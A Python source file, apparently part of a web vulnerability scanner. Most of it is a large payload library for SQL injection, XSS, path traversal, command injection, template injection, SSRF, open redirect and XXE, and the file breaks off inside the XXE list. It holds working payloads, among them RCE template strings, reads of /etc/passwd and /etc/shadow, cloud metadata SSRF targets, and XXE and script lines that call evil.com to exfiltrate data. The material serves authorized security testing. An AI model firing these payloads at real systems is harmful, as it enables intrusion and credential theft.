"""
Active Fuzzer — sends real attack payloads to all discovered input surfaces.
This is what separates a real DAST from an LLM-guided curl runner.

Vulnerability classes covered:
  SQLi, XSS, LFI/Path Traversal, CMDi, SSTI, SSRF, XXE,
  Open Redirect, IDOR, Header Injection, CORS, CRLF Injection,
  HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, CL.CL), CSRF,
  Buffer Overflow / Memory Corruption, XPath Injection,
  HTTP Response Splitting
"""
from __future__ import annotations
import re
import threading
import time
from dataclasses import dataclass
from typing import Optional, Callable, TYPE_CHECKING
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import requests.exceptions

if TYPE_CHECKING:
    from .oast import OASTServer
import urllib3
urllib3.disable_warnings()

from .scope import ScopeManager
from .evidence import EvidenceStore, evidence_store as _global_store


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARY — 500+ real attack payloads
# ══════════════════════════════════════════════════════════════════════════════

PAYLOADS: dict[str, list[str]] = {

    # ── Error-based SQLi (80+ payloads — MySQL, PostgreSQL, MSSQL, Oracle,
    #    SQLite, MariaDB, DB2, H2, CockroachDB, MongoDB/NoSQL) ────────────
    "sqli_error": [
        # Classic quote / syntax breaking
        "'", '"', "''", "`;", "'))", "')", "\\",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "' OR 1=1/*", "\" OR \"1\"=\"1",
        "1 OR 1=1", "1 AND 1=0", "1 AND 1=1",
        "1' AND '1'='1", "1' AND '1'='2",
        "admin'--", "admin' #", "admin'/*",
        "' or 1=1 limit 1 -- -+",
        # ORDER BY / GROUP BY column enumeration
        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 50--",
        "1' GROUP BY 1--",
        # UNION-based (MySQL, PostgreSQL, MSSQL)
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3,4,5--",
        "' UNION SELECT username,password FROM users--",
        "0 UNION SELECT 1,@@version,3--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
        # MySQL specific
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "extractvalue(1,concat(0x7e,version()))",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(user) FROM mysql.user) USING utf8)))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "'; SELECT SLEEP(0)--",
        # PostgreSQL specific
        "' AND CAST(version() AS int)--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        "';SELECT version()--",
        "' UNION SELECT NULL,current_database(),NULL--",
        "$1' AND 1=1--",  # dollar-quoting
        # MSSQL specific
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC master..xp_cmdshell('whoami')--",
        "1; SELECT * FROM information_schema.tables--",
        "' AND 1=DB_NAME()--",
        "'; SELECT @@servername--",
        "' UNION SELECT NULL,@@version,NULL--",
        # Oracle specific
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,banner,NULL FROM v$version--",
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' OR 1=1--",
        # SQLite specific
        "' UNION SELECT sql FROM sqlite_master--",
        "' AND CAST(sqlite_version() AS int)--",
        # Stacked queries
        "'; SELECT pg_sleep(0)--",
        "'; WAITFOR DELAY '0:0:0'--",
        "'; EXECUTE IMMEDIATE 'SELECT 1'--",
        # JSON / REST API specific
        '{"$gt":""}',  # MongoDB NoSQL
        '{"$ne":null}',  # MongoDB NoSQL
        "1' OR '1'='1' /*",
        # WAF bypass — inline comment encoding (MySQL)
        "1'/*!50000OR*/1=1--",
        "1'/*!UNION*//*!SELECT*/1,2,3--",
        "' /*!50000AND*/ 1=1--",
        # WAF bypass — case mixing & whitespace alternatives
        "1' oR 1=1--",
        "'%09OR%091=1--",   # tab instead of space
        "'%0aOR%0a1=1--",  # newline instead of space
        "'+OR+1=1--",      # plus as space
        # WAF bypass — encoding variants
        "0x31",             # hex encoding
        "%27%20OR%201%3D1--",  # URL-encoded ' OR 1=1--
        "' %4fR 1=1--",    # partial hex for 'O'
        # WAF bypass — double URL encoding
        "%2527%2520OR%25201%253D1--",
        # WAF bypass — Unicode
        "' \u004FR 1=1--",
        "' \uff2f\uff32 1=1--",  # fullwidth OR
        # Second-order / stored injection markers
        "test'||'injection",
        "test'/**/OR/**/1=1--",
    ],

    # ── Boolean-based blind SQLi (true/false pairs for differential analysis)
    "sqli_bool_true": [
        "' AND 1=1--",
        "' AND 1=1#",
        "' AND 'a'='a",
        "1 AND 1=1",
        "' OR 1=1--",
        "') AND 1=1--",
        "')) AND 1=1--",
        "' AND 1=1 AND '1'='1",
        "1) AND 1=1--",
    ],
    "sqli_bool_false": [
        "' AND 1=2--",
        "' AND 1=2#",
        "' AND 'a'='b",
        "1 AND 1=2",
        "' OR 1=2--",
        "') AND 1=2--",
        "')) AND 1=2--",
        "' AND 1=2 AND '1'='1",
        "1) AND 1=2--",
    ],

    # ── Time-based blind SQLi (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) ──
    "sqli_blind_time": [
        # MySQL
        "' AND SLEEP(3)--",
        "' AND SLEEP(3)#",
        "' OR SLEEP(3)--",
        "1 AND SLEEP(3)",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' AND BENCHMARK(5000000,SHA1('test'))--",
        "1' AND SLEEP(3) AND '1'='1",
        "') AND SLEEP(3)--",
        # MSSQL
        "1; WAITFOR DELAY '0:0:3'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:3' ELSE WAITFOR DELAY '0:0:0'--",
        # PostgreSQL
        "1;SELECT pg_sleep(3)--",
        "' OR pg_sleep(3)--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
        # Oracle
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
        "1 AND UTL_INADDR.GET_HOST_ADDRESS('sleep3.'||(SELECT 1 FROM DUAL))='x'",
        # SQLite
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    ],

    "xss_reflected": [
        # ── HTML context — basic tag injection ───────────────────────────
        "<script>alert(1)</script>",
        "<script src=//evil.com/x.js></script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert`1`</script>",                   # backtick invocation
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        # ── HTML context — tag + event handler injection ─────────────────
        "<img src=x onerror=alert(1)>",
        "<img/src=x onerror=alert(1)>",                # no space variant
        "<img src=x onerror=alert(1)//",                # unclosed tag
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<input onfocus=alert(1) autofocus>",           # reordered attrs
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<meter onmouseover=alert(1)>0</meter>",
        "<div onmouseover=alert(1)>XSS</div>",
        "<div onmouseenter=alert(1)>XSS</div>",
        "<div onpointerover=alert(1)>XSS</div>",       # pointer events
        "<table><tr><td onmouseover=alert(1)>XSS",
        "<isindex type=image src=x onerror=alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        # ── Attribute context — breaking out of attributes ───────────────
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        "`-alert(1)-`",                                 # backtick context
        "\"><svg/onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "\"><details/open/ontoggle=alert(1)>",
        # ── JavaScript context — breaking out of JS strings ──────────────
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        "\\'-alert(1)-\\'",
        "\"-alert(1)-\"",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",   # hex escape in JS
        "');alert(1);//",
        "\");alert(1);//",
        "}}};alert(1);//",
        "${alert(1)}",                                   # template literal
        "${7*7}",                                        # expression test
        # ── URL context — protocol handlers ──────────────────────────────
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript://comment%0aalert(1)",               # JS comment newline
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:alert(1)",                             # IE legacy
        "javascript:/*-->*/alert(1)",
        # ── Polyglot payloads — work across multiple contexts ────────────
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%0telerik11telerik>",
        "'\"--></style></script><script>alert(1)</script>",
        "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3gifTthLmltZyBzcmM9eA== onerror=alert(1)>",
        "'-alert(1)-'",
        "\"><svg/onload=alert(1)>",
        # ── Framework-specific ───────────────────────────────────────────
        "{{constructor.constructor('alert(1)')()}}",     # AngularJS 1.x sandbox escape
        "{{$on.constructor('alert(1)')()}}",             # AngularJS 1.x alt
        "{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
        "{{x={y:''.constructor.prototype};x.y.charAt=[].join;$eval('x=alert(1)')}}",
        "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        "{{_c.constructor('alert(1)')()}}",              # Vue.js template
        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        "{{alert(1)}}",                                  # generic template
        "{{{alert(1)}}}",                                # Mustache/Handlebars triple
        "#{alert(1)}",                                   # Ruby ERB / Pug
        # ── WAF bypass — case mixing ────────────────────────────────────
        "<Script>alert(1)</Script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<sCrIpT>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",   # nested tag
        "<scr\x00ipt>alert(1)</scr\x00ipt>",            # null byte
        # ── WAF bypass — encoding variants ───────────────────────────────
        "<%2Fscript><script>alert(1)<%2Fscript>",
        "%3Cscript%3Ealert(1)%3C/script%3E",            # URL encoded
        "%253Cscript%253Ealert(1)%253C/script%253E",    # double URL encoded
        "&#60;script&#62;alert(1)&#60;/script&#62;",    # HTML decimal entity
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",  # HTML hex entity
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",  # entity in attr
        "\u003cscript\u003ealert(1)\u003c/script\u003e",  # unicode escape
        "<img src=x onerror=\"alert(1)\"  >",           # extra whitespace
        "<img\tsrc=x\tonerror=alert(1)>",               # tab instead of space
        "<img\nsrc=x\nonerror=alert(1)>",               # newline as separator
        "<img/src=x/onerror=alert(1)>",                 # slash as separator
        # ── WAF bypass — tag mutation & obfuscation ──────────────────────
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<a href=\"\\x0Bjavascript:alert(1)\">click</a>",
        "<a href=\"&#1;javascript:alert(1)\">click</a>",
        "<a\thref=\"javascript:alert(1)\">click</a>",   # tab before href
        "<!--<script>-->alert(1)<!--</script>-->",       # comment bypass
        # ── DOM-based XSS markers (trigger DOM sinks) ────────────────────
        "#<img src=x onerror=alert(1)>",                 # location.hash sink
        "javascript:alert(1)//",                         # location.href sink
        "<img src=x onerror=alert(1)>",                  # innerHTML sink
        "'-alert(1)-'",                                  # document.write sink
        "';alert(1)//",                                  # eval / setTimeout sink
        "\");alert(1)//",                                # eval context
        "data:text/html,<script>alert(1)</script>",      # window.open sink
        "1;alert(1)",                                    # postMessage eval
        # ── CSP bypass attempts ──────────────────────────────────────────
        "<base href=//evil.com/>",                       # base tag hijack
        "<link rel=import href=//evil.com/x.html>",     # HTML import
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.min.js'></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
        # ── Mutation XSS (mXSS) — browser parser tricks ──────────────────
        "<listing><img src=1 onerror=alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<style><img src=\"</style><img src=x onerror=alert(1)>\"//",
        "<xmp><img src=\"</xmp><img src=x onerror=alert(1)>\"//",
    ],

    # ── Stored XSS — {CANARY} is replaced with a unique token per injection ──
    "xss_stored": [
        "<script>alert('{CANARY}')</script>",
        "<img src=x onerror=alert('{CANARY}')>",
        "<svg onload=alert('{CANARY}')>",
        "<body onload=alert('{CANARY}')>",
        "\"><script>alert('{CANARY}')</script>",
        "'><img src=x onerror=alert('{CANARY}')>",
        "<details open ontoggle=alert('{CANARY}')>",
        "<iframe srcdoc='<script>alert(\"{CANARY}\")</script>'>",
        "<div onmouseover=alert('{CANARY}')>{CANARY}</div>",
        "<input onfocus=alert('{CANARY}') autofocus>",
        "<a href=javascript:alert('{CANARY}')>{CANARY}</a>",
        "{CANARY}",   # plain text — test if stored at all (even if escaped)
    ],

    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",  # double URL encoding
        "..%c0%af..%c0%afetc%c0%afpasswd",       # UTF-8 encoding
        "../../../etc/passwd%00",                 # null byte
        "../../../etc/shadow",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "..\\..\\..\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "C:\\windows\\win.ini",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain,<?php phpinfo(); ?>",
    ],

    "cmdi": [
        # ── Original 30 payloads — Linux basic separators ────────────────
        ";id",
        "|id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "&&whoami",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "& ls",
        ";sleep 3",
        "|sleep 3",
        "&&sleep 3",
        ";ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
        "`sleep 3`",
        "$(sleep 3)",
        "\n/bin/sh -i",
        ";id;",
        "a;id",
        "a|id",
        "%0aid",                                # URL-encoded newline
        "%0a/usr/bin/id",
        "||id",
        "; echo 'CMDI_CONFIRMED'",
        "| echo 'CMDI_CONFIRMED'",
        # ── Windows cmd.exe commands ─────────────────────────────────────
        "&dir",
        "|dir",
        ";dir",
        "& dir C:\\",
        "| type C:\\Windows\\win.ini",
        "& type C:\\Windows\\win.ini",
        "& ipconfig /all",
        "| ipconfig",
        "& net user",
        "| net user",
        "& hostname",
        "| systeminfo",
        "& ver",                                # Windows version
        "| set",                                # Environment variables
        "& timeout /t 5 /nobreak",             # Windows time-based blind
        "| ping -n 5 127.0.0.1",              # Windows ping delay
        # ── PowerShell vectors ───────────────────────────────────────────
        ";powershell -c whoami",
        "|powershell -c \"Get-ChildItem\"",
        "&powershell -c \"[System.Net.Dns]::GetHostName()\"",
        ";powershell -c \"$env:USERNAME\"",
        "|powershell Invoke-Expression whoami",
        "&powershell -enc dwBoAG8AYQBtAGkA",   # base64 "whoami"
        # ── WAF bypass — IFS whitespace substitution ─────────────────────
        ";${IFS}id",
        ";$IFS$9id",
        ";{id}",                                # Brace no-space
        ";cat${IFS}/etc/passwd",
        ";cat$IFS$9/etc/passwd",
        "|cat${IFS}/etc/passwd",
        # ── WAF bypass — brace expansion ─────────────────────────────────
        ";{cat,/etc/passwd}",
        ";{ls,-la,/}",
        ";{echo,CMDI_CONFIRMED}",
        # ── WAF bypass — wildcard and concatenation ──────────────────────
        ";/???/??t /???/p??s??",                # /bin/cat /etc/passwd via wildcards
        ";c'a't /etc/passwd",                   # Quote-break bypass
        ";c\"a\"t /etc/passwd",                 # Double-quote break
        ";c\\at /etc/passwd",                   # Backslash bypass
        ";/bin/c?t /etc/passwd",                # Single-char wildcard
        # ── WAF bypass — hex / octal encoding ────────────────────────────
        ";$(printf '\\x69\\x64')",              # hex-encoded "id"
        ";$(printf '\\151\\144')",              # octal-encoded "id"
        ";$'\\x69\\x64'",                       # ANSI-C quoting "id"
        # ── WAF bypass — URL-encoded separators ──────────────────────────
        "%3Bid",                                # ; URL-encoded
        "%7Cid",                                # | URL-encoded
        "%26%26id",                             # && URL-encoded
        "%0d%0aid",                             # CRLF + id
        "%09id",                                # Tab separator
        "%0a%0did",                             # LF+CR
        # ── Double-encoding ──────────────────────────────────────────────
        "%253Bid",                              # Double-encoded ;
        "%257Cid",                              # Double-encoded |
        # ── Blind time-based — Linux ─────────────────────────────────────
        ";sleep${IFS}5",
        "|sleep${IFS}5",
        "&&sleep${IFS}5",
        "`sleep${IFS}5`",
        "$(sleep${IFS}5)",
        ";{sleep,5}",
        # ── Nested / chained ─────────────────────────────────────────────
        ";id|base64",                           # Exfil via encoding
        "$(echo${IFS}id|sh)",                   # Indirect execution
        ";bash -c 'id'",
        ";sh -c 'id'",
        ";/usr/bin/env id",
        # ── Context-aware (prepended value) ──────────────────────────────
        "127.0.0.1;id",                         # IP input + injection
        "127.0.0.1|id",
        "127.0.0.1&&id",
        "test@test.com;id",                     # Email input + injection
        "file.txt;id",                          # Filename input + injection
    ],

    "ssti": [
        # ── Original 16 payloads ──────────────────────────────────────────
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",                           # Jinja2 string repeat
        "{{config}}",                           # Flask/Jinja2 config leak
        "{{request.environ}}",
        "${7*7}",                               # Freemarker / Velocity
        "${class.getClassLoader()}",
        "*{7*7}",                               # Spring SpEL
        "@{7*7}",                               # Thymeleaf
        "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 RCE vector
        "%{7*7}",                               # JSP EL
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        # ── Jinja2 / Flask (Python) — additional ─────────────────────────
        "{{self.__init__.__globals__.__builtins__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os}}",
        "{{url_for.__globals__['__builtins__']}}",
        # ── Mako (Python) ────────────────────────────────────────────────
        "<%7*7%>",                              # Mako expression
        "${self.module.__loader__}",            # Mako module access
        "<%import os; x=os.popen('id').read()%>${x}",
        # ── Tornado (Python) ─────────────────────────────────────────────
        "{% import os %}{{os.popen('id').read()}}",
        "{%raw 7*7%}",
        # ── Twig (PHP) ──────────────────────────────────────────────────
        "{{_self.env.getFilter('id')}}",        # Twig _self access
        "{{['id']|filter('system')}}",          # Twig filter RCE
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{dump(app)}}",                        # Twig debug dump
        # ── Smarty (PHP) ─────────────────────────────────────────────────
        "{7*7}",                                # Smarty arithmetic
        "{php}echo 7*7;{/php}",                 # Smarty PHP tag (v3-)
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[c]); ?>',self::clearConfig())}",
        "{if 7*7}{/if}",                        # Smarty if eval
        "{system('id')}",                       # Smarty direct function
        # ── Freemarker (Java) ────────────────────────────────────────────
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${object.getClass().forName(\"java.lang.Runtime\")}",
        "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
        # ── Velocity (Java) ──────────────────────────────────────────────
        "#set($x=7*7)${x}",                    # Velocity set + eval
        "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id'))",
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        # ── Pebble (Java) ────────────────────────────────────────────────
        "{{\"\".__class}}",                     # Pebble class access
        "{%set cmd='id'%}{{\"\".__class.forName('java.lang.Runtime').getRuntime().exec(cmd)}}",
        # ── Spring SpEL (Java) — additional ──────────────────────────────
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        # ── Thymeleaf (Java) — additional ────────────────────────────────
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        # ── ERB (Ruby) — additional ──────────────────────────────────────
        "<%= system('id') %>",                  # ERB command execution
        "<%= IO.popen('id').read %>",           # ERB IO pipe
        "<%= `id` %>",                          # ERB backtick exec
        # ── Slim (Ruby) ─────────────────────────────────────────────────
        "= system('id')",                       # Slim inline eval
        "- system('id')",                       # Slim code line
        # ── Jade / Pug (Node.js) ─────────────────────────────────────────
        "=7*7",                                 # Pug unbuffered eval
        "#{root.process.mainModule.require('child_process').execSync('id')}",
        # ── Handlebars (Node.js) ─────────────────────────────────────────
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 7*7\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        # ── Nunjucks (Node.js) ───────────────────────────────────────────
        "{{range.constructor(\"return 7*7\")()}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        # ── Dust.js (Node.js) ────────────────────────────────────────────
        "{@math key=\"7\" method=\"multiply\" operand=\"7\"/}",
        "{@if cond=\"7*7\"}{/if}",
        # ── Go templates ─────────────────────────────────────────────────
        "{{.}}",                                # Go dump context
        "{{printf \"%d\" 49}}",                 # Go printf
        "{{html \"<script>\"}}",                # Go html function
        # ── Razor (.NET) ─────────────────────────────────────────────────
        "@(7*7)",                               # Razor expression
        "@{var x=7*7;}@x",                      # Razor code block
        "@System.Diagnostics.Process.Start(\"cmd\",\"/c id\")",
        # ── EL / OGNL (Java — Struts/JSP) ───────────────────────────────
        "${7*7}",                               # Unified EL
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-SSTI','49')}",
        "${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}",
        "%{(#rt=@java.lang.Runtime@getRuntime().exec('id'))}",
    ],

    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",           # AWS
        "http://169.254.169.254/latest/meta-data/iam/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://100.100.100.200/latest/meta-data/",            # Alibaba
        "http://169.254.169.254/metadata/instance",            # Azure
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",               # Redis
        "http://127.0.0.1:5432",               # Postgres
        "http://127.0.0.1:27017",              # MongoDB
        "http://127.0.0.1:9200",               # Elasticsearch
        "http://127.0.0.1:8080/admin",
        "http://[::1]/",                        # IPv6 localhost
        "http://2130706433/",                   # Decimal IP for 127.0.0.1
        "http://0x7f000001/",                   # Hex IP
        "http://spoofed.burpcollaborator.net/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",
    ],

    "open_redirect": [
        # ── Original 18 payloads ─────────────────────────────────────────
        "https://evil.com",
        "//evil.com",
        "https://evil.com/",
        "/\\evil.com",
        "https://evil.com?trusted.com",
        "https://trusted.com.evil.com",
        "https://evil.com#trusted.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "\\/\\/evil.com",
        "%2F%2Fevil.com",
        "%0aLocation:https://evil.com",         # CRLF + open redirect
        "https:evil.com",
        "https:%0aevil.com",
        "https://evil%2ecom",
        "https://evil.com%23@trusted.com",
        "///evil.com",
        "////evil.com",
        # ── Protocol-relative variants ───────────────────────────────────
        "//evil.com/",
        "//evil.com/%2f..",
        "\\\\evil.com",                         # UNC-style
        "/\\/evil.com",
        "//evil.com\\@trusted.com",
        # ── Backslash bypass ─────────────────────────────────────────────
        "/\\\\evil.com",
        "\\/evil.com",
        "/%5Cevil.com",                         # URL-encoded backslash
        "/\\%09/evil.com",                      # Tab in path
        # ── Auth @ trick ─────────────────────────────────────────────────
        "https://trusted.com@evil.com",
        "https://trusted.com%40evil.com",
        "//trusted.com@evil.com",
        "https://evil.com%252f@trusted.com",    # Double-encoded /
        # ── Whitespace and null byte bypass ──────────────────────────────
        "//evil.com%00",                        # Null byte
        "//evil.com%20",                        # Trailing space
        "/%0d/evil.com",                        # CR in path
        "/%0a/evil.com",                        # LF in path
        " //evil.com",                          # Leading space
        "\t//evil.com",                         # Leading tab
        # ── URL scheme variations ────────────────────────────────────────
        "http:evil.com",
        "http:/evil.com",
        "http:\\\\evil.com",
        "https:///evil.com",
        "http:@evil.com",
        "HtTpS://evil.com",                    # Mixed case scheme
        # ── Unicode / homograph ──────────────────────────────────────────
        "https://evіl.com",                     # Cyrillic і (U+0456)
        "https://evil。com",                     # Fullwidth period
        "//evil%E3%80%82com",                   # URL-encoded fullwidth period
        # ── Double encoding ──────────────────────────────────────────────
        "%252F%252Fevil.com",                   # Double-encoded //
        "%252Fevil.com",
        # ── javascript: URI variants ─────────────────────────────────────
        "javascript://evil.com/%0aalert(1)",
        "javascript:void(0)//evil.com",
        "JaVaScRiPt:alert(1)",                  # Case bypass
        "java%0ascript:alert(1)",               # Newline in scheme
        "javascript://%0aalert(document.domain)",
        # ── data: URI variants ───────────────────────────────────────────
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        # ── Meta refresh injection ───────────────────────────────────────
        "0;url=https://evil.com",               # Meta refresh content value
        "1;url=https://evil.com",
        # ── Relative path bypass ─────────────────────────────────────────
        "/redirect?url=/\\evil.com",
        ".evil.com",
        "..evil.com",
        "https://evil.com/..;/trusted.com",
    ],

    "xxe": [
        # ── Original 5 payloads ──────────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]><x/>',
        '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        # ── Classic entity — Linux ───────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/issue">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/version">]><x>&xxe;</x>',
        # ── Classic entity — Windows ─────────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><x>&xxe;</x>',
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><x>&xxe;</x>',
        # ── Parameter entity exfil (OOB) ─────────────────────────────────
        '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;%send;]><x/>',
